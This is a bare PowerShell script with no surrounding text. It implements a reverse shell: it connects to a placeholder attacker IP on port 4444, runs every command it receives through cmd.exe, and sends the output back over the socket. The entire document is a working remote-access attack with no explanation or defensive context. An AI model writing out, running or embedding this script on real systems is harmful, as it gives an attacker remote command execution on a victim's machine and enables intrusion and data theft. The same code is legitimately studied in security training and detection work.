$client = New-Object System.Net.Sockets.TCPClient("<attacker_ip>",4444);
$stream = $client.GetStream();
$reader = New-Object System.IO.StreamReader($stream);
$writer = New-Object System.IO.StreamWriter($stream);
$writer.AutoFlush = $true;
while ($true) {
    $command = $reader.ReadLine();
    if ($command -eq "exit") {break;}
    $output = cmd.exe /c $command 2>&1;
    $writer.WriteLine($output);
}
$client.Close()
